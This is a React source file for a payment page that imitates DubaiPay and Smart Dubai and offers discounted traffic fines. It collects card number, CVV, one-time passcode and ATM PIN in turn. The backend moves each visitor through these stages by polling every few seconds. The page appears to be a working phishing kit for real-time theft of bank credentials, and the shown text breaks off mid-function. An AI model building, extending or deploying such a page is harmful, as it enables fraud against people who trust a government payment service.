import React, { useState, useEffect, type ReactNode, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed" | "installment";

type InstallmentData = {
  fullName: string;
  phone: string;
  emiratesId: string;
  email: string;
  emirate: string;
  plateCode: string;
  plateNumber: string;
  totalAmount: string;
  bank: string;
  duration: string;
};

type CardSubmitPayload = {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
};

function PaymentFrame({ children }: { children: ReactNode }) {
  return (
    <div className="min-h-screen bg-[#eef3f7] px-3 py-4 sm:py-6" dir="ltr">
      <div className="mx-auto max-w-[430px] overflow-hidden rounded-[34px] border border-[#e7edf5] bg-white shadow-[0_28px_70px_rgba(15,23,42,0.14)]">
        {children}
      </div>
    </div>
  );
}

function PaymentGatewayHeader() {
  return (
    <div className="bg-white px-4 pb-4 pt-5 sm:px-5">
      <div className="mx-auto mb-4 h-1.5 w-20 rounded-full bg-[#eef2f7]" />
      <div className="flex items-center justify-between gap-3 border-b border-[#edf2f7] pb-4">
        <img
          src="/dubaipay-logo.png"
          alt="DubaiPay"
          className="h-12 w-auto max-w-[150px] object-contain sm:h-14"
        />
        <img
          src="/smart-dubai-logo.png"
          alt="Smart Dubai"
          className="h-11 w-auto max-w-[128px] object-contain sm:h-12"
        />
      </div>
    </div>
  );
}

function InstallmentSummary({ data, lang }: { data: InstallmentData; lang: string }) {
  const isRTL = lang === "ar";
  
  return (
    <div style={{ direction: isRTL ? "rtl" : "ltr" }}>
      <SectionCard title={lang === "ar" ? "ملخص طلب التقسيط" : "Installment Request Summary"}>
        <div style={{ padding: "16px", backgroundColor: "#f9fafb" }}>
          <div style={{ marginBottom: "16px" }}>
            <h4 style={{ fontSize: "14px", fontWeight: 700, color: "#374151", marginBottom: "12px" }}>
              {lang === "ar" ? "البيانات الشخصية" : "Personal Information"}
            </h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", fontSize: "13px" }}>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الاسم:" : "Name:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.fullName}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الهاتف:" : "Phone:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.phone}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الهوية:" : "Emirates ID:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.emiratesId}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "البريد:" : "Email:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.email}</div>
              </div>
            </div>
          </div>

          <div style={{ marginBottom: "16px" }}>
            <h4 style={{ fontSize: "14px", fontWeight: 700, color: "#374151", marginBottom: "12px" }}>
              {lang === "ar" ? "بيانات المركبة" : "Vehicle Information"}
            </h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", fontSize: "13px" }}>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الإمارة:" : "Emirate:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.emirate}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "رمز اللوحة:" : "Plate Code:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.plateCode}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "رقم اللوحة:" : "Plate Number:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.plateNumber}</div>
              </div>
            </div>
          </div>

          <div style={{ marginBottom: "16px" }}>
            <h4 style={{ fontSize: "14px", fontWeight: 700, color: "#374151", marginBottom: "12px" }}>
              {lang === "ar" ? "بيانات التقسيط" : "Installment Details"}
            </h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", fontSize: "13px" }}>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "المبلغ:" : "Amount:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.totalAmount} AED</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "البنك:" : "Bank:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.bank}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "المدة:" : "Duration:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.duration} {lang === "ar" ? "شهر" : "months"}</div>
              </div>
            </div>
          </div>
        </div>
      </SectionCard>
    </div>
  );
}


function SectionCard({ title, children }: { title: string; children: ReactNode }) {
  return (
    <section className="overflow-hidden rounded-[22px] border border-[#edf2f7] bg-white shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
      <div className="border-t-2 border-[#bcd8ea] bg-[#f4f8fc] px-5 py-4 text-[15px] font-semibold text-[#7a8796]">
        {title}
      </div>
      <div className="px-5 py-4">{children}</div>
    </section>
  );
}

function InfoTable({ rows }: { rows: Array<{ label: string; value: string }> }) {
  return (
    <div className="space-y-0">
      {rows.map((row, index) => (
        <div
          key={`${row.label}-${index}`}
          className="flex items-center justify-between gap-4 border-b border-[#eef3f7] py-3 last:border-b-0"
        >
          <span className="text-[15px] text-[#697586]">{row.label}</span>
          <span className="text-right text-[15px] font-medium text-[#2a3342]">{row.value}</span>
        </div>
      ))}
    </div>
  );
}

function ErrorBanner({ message }: { message: string }) {
  return (
    <div className="mb-4 rounded-2xl border border-[#f1c5c8] bg-[#fff5f5] px-4 py-3 text-[13px] text-[#c74343]">
      {message}
    </div>
  );
}

function CvvCardIcon() {
  return (
    <svg width="84" height="58" viewBox="0 0 84 58" fill="none" xmlns="http://www.w3.org/2000/svg" className="h-12 w-auto">
      <rect x="6" y="8" width="46" height="34" rx="6" fill="#93A1AF" />
      <rect x="6" y="14" width="46" height="7" fill="#56616D" />
      <rect x="35" y="28" width="24" height="17" rx="5" fill="#E9F0F6" stroke="#AAB7C4" />
      <rect x="41" y="33" width="12" height="4" rx="2" fill="#FFFFFF" />
      <circle cx="46" cy="35" r="1.7" fill="#D33B49" />
      <circle cx="51" cy="35" r="1.7" fill="#D33B49" />
      <circle cx="56" cy="35" r="1.7" fill="#D33B49" />
    </svg>
  );
}

function DonateIcon() {
  return (
    <svg width="72" height="58" viewBox="0 0 72 58" fill="none" xmlns="http://www.w3.org/2000/svg" className="h-12 w-auto text-[#1d3568]">
      <rect x="9" y="26" width="24" height="16" rx="2.5" stroke="currentColor" strokeWidth="2.2" />
      <path d="M15 26V20.5C15 18.6 16.6 17 18.5 17H23.5C25.4 17 27 18.6 27 20.5V26" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" />
      <path d="M33 31.5H40.5C42.8 31.5 44.7 33.4 44.7 35.7C44.7 38 42.8 39.9 40.5 39.9H28.3" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" />
      <path d="M28.3 39.9L20.5 39.9C18.9 39.9 17.5 39.2 16.5 38L12 32.8" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M44.8 36.2L54.4 31.3C56.4 30.3 58.8 31.1 59.8 33.1C60.8 35.1 60 37.5 58 38.5L45.2 45.2C43.8 45.9 42.1 46.1 40.6 45.7L29.5 42.8C28.3 42.5 27 42.7 26 43.4L23.5 45" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M46 25.5C48.9 24.1 50.2 21.4 50.2 19.4C50.2 17.3 48.8 15.9 46.9 15.9C45.3 15.9 44 16.9 43.4 18.4C42.7 16.9 41.5 15.9 39.9 15.9C38 15.9 36.6 17.3 36.6 19.4C36.6 21.4 37.9 24.1 40.8 25.5L43.4 26.8L46 25.5Z" fill="#17a0d7" />
    </svg>
  );
}

function SecurityLogos() {
  return (
    <div className="mt-5 overflow-hidden rounded-[18px] border border-[#e7edf5] bg-white p-2 shadow-sm">
      <img src="/card-brands.png" alt="Visa Mastercard American Express Discover" className="h-auto w-full rounded-[14px] object-contain" />
    </div>
  );
}

function PaymentActionBar({
  isLoading,
  onCancel,
}: {
  isLoading: boolean;
  onCancel: () => void;
}) {
  return (
    <div className="mt-5 overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-4">
      <div className="flex items-center gap-3">
        <button
          type="button"
          onClick={onCancel}
          className="flex-1 rounded-full bg-white px-5 py-3 text-[16px] font-medium text-[#6a7380] shadow-sm transition hover:bg-[#f8fbff]"
        >
          Cancel
        </button>
        <button
          type="submit"
          disabled={isLoading}
          className="flex-1 rounded-full bg-[#0d67be] px-5 py-3 text-[16px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? "Processing..." : "Pay"}
        </button>
      </div>
    </div>
  );
}

function PaymentFooter() {
  return (
    <div className="px-6 pb-7 pt-5 text-center">
      <p className="text-[15px] text-[#2f3746]">
        For more inquiries please call <span className="font-semibold text-[#1271bf]">600 560 000</span>
      </p>
      <p className="mt-2 text-[12px] text-[#8a95a3]">Copyright © 2020. All rights reserved.</p>
    </div>
  );
}

function CardForm({
  onSubmit,
  onCancel,
  isLoading,
  error,
  fineAmount,
  discountAmount,
  totalAmount,
}: {
  onSubmit: (data: CardSubmitPayload) => void;
  onCancel: () => void;
  isLoading: boolean;
  error?: string | null;
  fineAmount: string;
  discountAmount: string;
  totalAmount: string;
}) {
  const [cardName] = useState("Dubai Pay");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const { t } = useLanguage();

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const monthOptions = Array.from({ length: 12 }, (_, index) => String(index + 1).padStart(2, "0"));
  const yearOptions = Array.from({ length: 12 }, (_, index) => String((new Date().getFullYear() + index) % 100).padStart(2, "0"));

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (cardNumber.replace(/\s/g, "").length < 16) newErrors.cardNumber = t.payment.card.errors.cardNumber;
    if (expiryMonth.length !== 2 || Number(expiryMonth) < 1 || Number(expiryMonth) > 12) newErrors.cardExpiry = t.payment.card.errors.expiry;
    if (expiryYear.length !== 2) newErrors.cardExpiry = t.payment.card.errors.expiry;
    if (cardCvv.length < 3) newErrors.cardCvv = t.payment.card.errors.cvv;
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    onSubmit({
      cardName,
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv,
    });
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {error && <ErrorBanner message={error} />}

      <SectionCard title="Card Details">
        <div className="space-y-4">
          <div className="grid grid-cols-1 gap-x-3 gap-y-2 sm:grid-cols-[112px_minmax(0,1fr)] sm:items-center">
            <label className="text-[14px] font-medium text-[#1e293b] sm:text-[15px]">Card Number</label>
            <div className="min-w-0">
              <input
                type="text"
                inputMode="numeric"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                placeholder="Enter Card Number"
                maxLength={19}
                className={`h-12 w-full min-w-0 rounded-[10px] border bg-white px-3 text-[14px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] sm:px-4 sm:text-[15px] ${errors.cardNumber ? "border-[#ef9a9a]" : "border-[#c9d3de]"}`}
              />
              {errors.cardNumber && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardNumber}</p>}
            </div>
          </div>

          <div className="grid grid-cols-1 gap-x-3 gap-y-2 sm:grid-cols-[112px_minmax(0,1fr)] sm:items-center">
            <label className="text-[14px] font-medium text-[#1e293b] sm:text-[15px]">Expiry Date</label>
            <div className="min-w-0">
              <div className="grid grid-cols-[minmax(0,1fr)_18px_minmax(0,1fr)] items-center gap-2 sm:max-w-[220px]">
                <select
                  value={expiryMonth}
                  onChange={(e) => setExpiryMonth(e.target.value)}
                  className={`h-12 w-full min-w-0 rounded-[10px] border bg-white px-3 text-center text-[14px] text-[#273447] outline-none transition focus:border-[#8ab9db] sm:text-[15px] ${errors.cardExpiry ? "border-[#ef9a9a]" : "border-[#c9d3de]"}`}
                >
                  <option value="">MM</option>
                  {monthOptions.map((month) => (
                    <option key={month} value={month}>{month}</option>
                  ))}
                </select>
                <span className="text-center text-[20px] text-[#95a1af]">/</span>
                <select
                  value={expiryYear}
                  onChange={(e) => setExpiryYear(e.target.value)}
                  className={`h-12 w-full min-w-0 rounded-[10px] border bg-white px-3 text-center text-[14px] text-[#273447] outline-none transition focus:border-[#8ab9db] sm:text-[15px] ${errors.cardExpiry ? "border-[#ef9a9a]" : "border-[#c9d3de]"}`}
                >
                  <option value="">YY</option>
                  {yearOptions.map((year) => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
              </div>
              {errors.cardExpiry && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardExpiry}</p>}
            </div>
          </div>

          <div className="grid grid-cols-1 gap-x-3 gap-y-2 sm:grid-cols-[112px_minmax(0,1fr)] sm:items-center">
            <label className="text-[14px] font-medium text-[#1e293b] sm:text-[15px]">CVV Number</label>
            <div className="min-w-0">
              <div className="flex flex-wrap items-center gap-3 sm:flex-nowrap">
                <input
                  type="password"
                  inputMode="numeric"
                  value={cardCvv}
                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  placeholder="CVV"
                  maxLength={4}
                  className={`h-12 w-[92px] min-w-0 rounded-[10px] border bg-white px-3 text-center text-[14px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] sm:text-[15px] ${errors.cardCvv ? "border-[#ef9a9a]" : "border-[#c9d3de]"}`}
                />
                <CvvCardIcon />
              </div>
              {errors.cardCvv && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardCvv}</p>}
            </div>
          </div>

          <p className="pt-2 text-[12px] leading-6 text-[#6e7b89] sm:text-[13px]">
            CVV number (Security Code) is the last three digits of the number found on the back of your credit card near the signature strip.
          </p>

          <SecurityLogos />
        </div>
      </SectionCard>

      <div className="rounded-[22px] border border-[#edf2f7] bg-white px-4 py-4 shadow-[0_8px_24px_rgba(148,163,184,0.08)] sm:px-5">
        <div className="flex items-center gap-3">
          <input type="checkbox" className="h-5 w-5 shrink-0 rounded border-[#cbd5e1] text-[#0d67be] focus:ring-[#0d67be]" />
          <div className="min-w-0 flex-1 overflow-hidden">
            <p className="overflow-hidden text-ellipsis whitespace-nowrap text-[13px] font-semibold leading-6 text-[#1d3568] sm:text-[14px]">Donate for charity “Dirham Alkhair”</p>
            <button type="button" className="mt-1 text-[14px] text-[#0d67be] underline underline-offset-2">
              Learn More
            </button>
          </div>
        </div>
      </div>

      <PaymentActionBar
        isLoading={isLoading}
        onCancel={onCancel}
      />
    </form>
  );
}

function WaitingPage({ message }: { message: string }) {
  return (
    <div className="rounded-[22px] border border-[#edf2f7] bg-white px-5 py-12 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
      <div className="mx-auto mb-5 h-14 w-14 animate-spin rounded-full border-[3px] border-[#d8e6f3] border-t-[#0d67be]" />
      <h3 className="text-[20px] font-semibold text-[#263445]">Processing Request</h3>
      <p className="mt-3 text-[14px] leading-7 text-[#6f7b88]">{message}</p>
      <p className="mt-2 text-[13px] text-[#90a0b2]">Please wait and do not close this page.</p>
    </div>
  );
}

function OtpForm({
  onSubmit,
  isLoading,
  error,
  rows,
}: {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  error?: string | null;
  rows: Array<{ label: string; value: string }>;
}) {
  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState("");
  const { t } = useLanguage();

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (otp.length < 4) {
      setOtpError(t.payment.otp.error);
      return;
    }
    setOtpError("");
    onSubmit(otp);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <SectionCard title="ملخص المبلغ">
        <InfoTable rows={rows} />
      </SectionCard>

      {(error || otpError) && <ErrorBanner message={error || otpError} />}

      <SectionCard title="Card Security Verification">
        <div className="text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-[#d7e7f5] bg-[#edf5fd] text-[28px] shadow-sm">📱</div>
          <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.otp.title}</h3>
          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.otp.subtitle}</p>
          <input
            type="text"
            inputMode="numeric"
            value={otp}
            onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))}
            placeholder={t.payment.otp.placeholder}
            maxLength={8}
            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
          />
        </div>
      </SectionCard>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? t.payment.otp.verifying : t.payment.otp.confirmButton}
        </button>
      </div>
    </form>
  );
}


function AtmPinForm({
  onSubmit,
  isLoading,
  error,
  rows,
}: {
  onSubmit: (pin: string) => void;
  isLoading: boolean;
  error?: string | null;
  rows: Array<{ label: string; value: string }>;
}) {
  const [pin, setPin] = useState("");
  const [pinError, setPinError] = useState("");
  const { t } = useLanguage();

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (pin.length < 4) {
      setPinError(t.payment.atm.error);
      return;
    }
    setPinError("");
    onSubmit(pin);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <SectionCard title="ملخص المبلغ">
        <InfoTable rows={rows} />
      </SectionCard>

      {(error || pinError) && <ErrorBanner message={error || pinError} />}

      <SectionCard title="ATM PIN Verification">
        <div className="text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-[#ffe1b4] bg-[#fff4e6] text-[28px] shadow-sm">🏧</div>
          <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.atm.title}</h3>
          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.atm.subtitle}</p>
          <input
            type="password"
            inputMode="numeric"
            value={pin}
            onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 6))}
            placeholder="••••"
            maxLength={6}
            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
          />
          <div className="mt-4 rounded-2xl border border-[#ffe1b4] bg-[#fff8eb] px-4 py-3 text-right text-[13px] leading-6 text-[#9b6b11]">
            {t.payment.atm.warning}
          </div>
        </div>
      </SectionCard>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? t.payment.atm.verifying : t.payment.atm.confirmButton}
        </button>
      </div>
    </form>
  );
}

function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () => void }) {
  const { t, lang } = useLanguage();

  return (
    <div className="space-y-4">
      <div className="rounded-[22px] border border-[#daf0df] bg-white px-5 py-10 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#e8f8ec] text-[30px]">✅</div>
        <h2 className="text-[22px] font-semibold text-[#12834d]">{t.payment.success.title}</h2>
        <p className="mt-2 text-[14px] text-[#6f7b88]">{t.payment.success.subtitle}</p>
        <div className="mt-6 rounded-[18px] bg-[#f5faf7] px-5 py-4">
          <p className="text-[13px] text-[#6f7b88]">{t.payment.success.amountPaid}</p>
          <p className="mt-1 text-[28px] font-semibold text-[#12834d]">{totalAmount} {t.payment.header.currency}</p>
        </div>
        <div className="mt-4 rounded-[18px] bg-[#f8fafc] px-5 py-4 text-left">
          <p className="text-[13px] text-[#6f7b88]">{t.payment.success.reference}</p>
          <p className="mt-1 font-mono text-[14px] text-[#273447]">DP-{Date.now().toString().slice(-8)}</p>
          <p className="mt-1 text-[12px] text-[#94a3b8]">{new Date().toLocaleString(lang === "ar" ? "ar-AE" : "en-AE")}</p>
        </div>
      </div>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="button"
          onClick={onDone}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7]"
        >
          {t.payment.success.backButton}
        </button>
      </div>
    </div>
  );
}

function FailedPage({ onRetry }: { onRetry: () => void }) {
  const { t } = useLanguage();

  return (
    <div className="space-y-4">
      <div className="rounded-[22px] border border-[#f5d0d0] bg-white px-5 py-10 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#fff1f1] text-[30px]">❌</div>
        <h2 className="text-[22px] font-semibold text-[#cf4444]">{t.payment.failed.title}</h2>
        <p className="mt-2 text-[14px] text-[#6f7b88]">{t.payment.failed.subtitle}</p>
      </div>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="button"
          onClick={onRetry}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7]"
        >
          {t.payment.failed.retryButton}
        </button>
      </div>
    </div>
  );
}

export default function Payment() {
  const [location, navigate] = useLocation();
  const { t, lang, setLanguage } = useLanguage();
  const isArabicRoute = location === "/ar/payment" || location.startsWith("/ar/payment?");
  const homePath = isArabicRoute ? "/ar" : "/";

  useEffect(() => {
    setLanguage(isArabicRoute ? "ar" : "en");
  }, [isArabicRoute, setLanguage]);

  const buildLocalizedPaymentPath = (targetLang: "ar" | "en") => {
    const params = window.location.search || "";
    return targetLang === "ar" ? `/ar/payment${params}` : `/payment${params}`;
  };

  const handleLanguageNavigation = () => {
    const nextLang = isArabicRoute ? "en" : "ar";
    setLanguage(nextLang);
    navigate(buildLocalizedPaymentPath(nextLang));
  };

  const getPaymentContextFromUrl = () => {
    try {
      const params = new URLSearchParams(window.location.search);
      return {
        sessionId: params.get("sessionId"),
        totalAmount: params.get("total") || "0",
      };
    } catch {
      return {
        sessionId: null,
        totalAmount: "0",
      };
    }
  };

  const [paymentData] = useState(() => {
    try {
      const raw = sessionStorage.getItem("paymentData");
      if (raw) return JSON.parse(raw);
    } catch {}

    const fallback = getPaymentContextFromUrl();
    if (fallback.sessionId) {
      return {
        selectedFines: [],
        totalAmount: fallback.totalAmount,
        sessionId: fallback.sessionId,
      };
    }

    return null;
  });

  const [sessionId, setSessionId] = useState<string | null>(() => {
    const urlSessionId = getPaymentContextFromUrl().sessionId;
    if (urlSessionId) return urlSessionId;

    try {
      return sessionStorage.getItem("paymentSessionId");
    } catch {
      return null;
    }
  });

  const [stage, setStage] = useState<Stage>("card");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const createSession = trpc.payment.createSession.useMutation();
  const submitCard = trpc.payment.submitCard.useMutation();
  const submitOtp = trpc.payment.submitOtp.useMutation();
  const submitAtmPin = trpc.payment.submitAtmPin.useMutation();

  const statusQuery = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && stage !== "success" && stage !== "failed",
      refetchInterval: stage === "success" || stage === "failed" ? false : 3000,
      refetchIntervalInBackground: true,
    }
  );

  useEffect(() => {
    if (!sessionId) return;
    try {
      sessionStorage.setItem("paymentSessionId", sessionId);
    } catch {}
  }, [sessionId]);

  useEffect(() => {
    if (!sessionId && paymentData) {
      createSession.mutateAsync({
        selectedFines: paymentData.selectedFines || [],
        totalAmount: paymentData.totalAmount || "0",
        plateNumber: paymentData.plateNumber,
        plateSource: paymentData.plateSource,
        plateCode: paymentData.plateCode,
        queryId: paymentData.queryId,
      }).then((res) => {
        if (res.success) {
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }).catch(console.error);
    }
  }, []);

  useEffect(() => {
    if (!statusQuery.data) return;
    const newStage = statusQuery.data.stage as Stage;
    const newError = statusQuery.data.errorMessage;

    if (newStage !== stage) {
      setStage(newStage);
      setErrorMessage(newError || null);
    }
  }, [statusQuery.data]);

  if (!paymentData && !sessionId) {
    return (
      <PaymentFrame>
        <PaymentGatewayHeader />
        <div className="px-4 pb-8 sm:px-5">
          <div className="rounded-[22px] border border-[#edf2f7] bg-white px-5 py-12 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
            <p className="text-[15px] leading-7 text-[#5f6c7b]">{t.payment.noData.message}</p>
            <button
              onClick={() => navigate(homePath)}
              className="mt-5 rounded-full bg-[#0d67be] px-6 py-3 text-[16px] font-semibold text-white transition hover:bg-[#0a5aa7]"
            >
              {t.payment.noData.backButton}
            </button>
          </div>
        </div>
        <PaymentFooter />
      </PaymentFrame>
    );
  }

  const totalAmount = paymentData?.totalAmount || paymentData?.dueAmount || "0";
  const selectedFinesTotal = Array.isArray(paymentData?.selectedFines)
    ? paymentData.selectedFines.reduce((sum: number, fine: any) => {
        const amount = parseFloat(String(fine?.amount || "0").replace(/[^0-9.]/g, ""));
        return sum + (Number.isNaN(amount) ? 0 : amount);
      }, 0)
    : 0;
  const totalAmountNumber = parseFloat(String(totalAmount).replace(/[^0-9.]/g, "")) || 0;
  const fineAmount = String(paymentData?.fineAmount || (selectedFinesTotal || totalAmountNumber).toFixed(0));
  
  // Calculate 50% discount
  const fineAmountNumber = parseFloat(String(fineAmount).replace(/[^0-9.]/g, "")) || 0;
  const calculatedDiscount = (fineAmountNumber * 0.5).toFixed(0);
  const discountAmount = String(paymentData?.discountAmount || calculatedDiscount);
  const dueAmount = String(paymentData?.dueAmount || (fineAmountNumber - parseFloat(discountAmount)).toFixed(0));

  const transactionRows = [
    { label: "قيمة المخالفات", value: `${fineAmount} AED` },
    { label: "قيمة الخصم", value: `${discountAmount} AED` },
    { label: "المبلغ المستحق", value: `${dueAmount} AED` },
  ];

  const handleCardSubmit = async (data: CardSubmitPayload) => {
    setIsSubmitting(true);
    try {
      let currentSessionId = sessionId;
      if (!currentSessionId && paymentData) {
        const res = await createSession.mutateAsync({
          selectedFines: paymentData.selectedFines || [],
          totalAmount: paymentData.totalAmount || "0",
          plateNumber: paymentData.plateNumber,
          plateSource: paymentData.plateSource,
          plateCode: paymentData.plateCode,
          queryId: paymentData.queryId,
        });
        if (res.success) {
          currentSessionId = res.sessionId;
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }
      if (!currentSessionId) {
        setErrorMessage(lang === "ar" ? "حدث خطأ في إنشاء جلسة الدفع. يرجى المحاولة مرة أخرى." : "An error occurred while creating the payment session. Please try again.");
        return;
      }
      await submitCard.mutateAsync({ sessionId: currentSessionId, ...data });
      setStage("card_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleOtpSubmit = async (otpCode: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    try {
      await submitOtp.mutateAsync({ sessionId, otpCode });
      setStage("otp_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleAtmPinSubmit = async (atmPin: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    try {
      await submitAtmPin.mutateAsync({ sessionId, atmPin });
      setStage("atm_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleDone = () => {
    sessionStorage.removeItem("paymentData");
    sessionStorage.removeItem("paymentSessionId");
    navigate(homePath);
  };

  const handleRetry = () => {
    sessionStorage.removeItem("paymentSessionId");
    setSessionId(null);
    setStage("card");
    setErrorMessage(null);
    if (paymentData) {
      createSession.mutateAsync({
        selectedFines: paymentData.selectedFines || [],
        totalAmount: paymentData.totalAmount || "0",
        plateNumber: paymentData.plateNumber,
        plateSource: paymentData.plateSource,
        plateCode: paymentData.plateCode,
        queryId: paymentData.queryId,
      }).then((res) => {
        if (res.success) {
          setSessionId(res.sessionId);
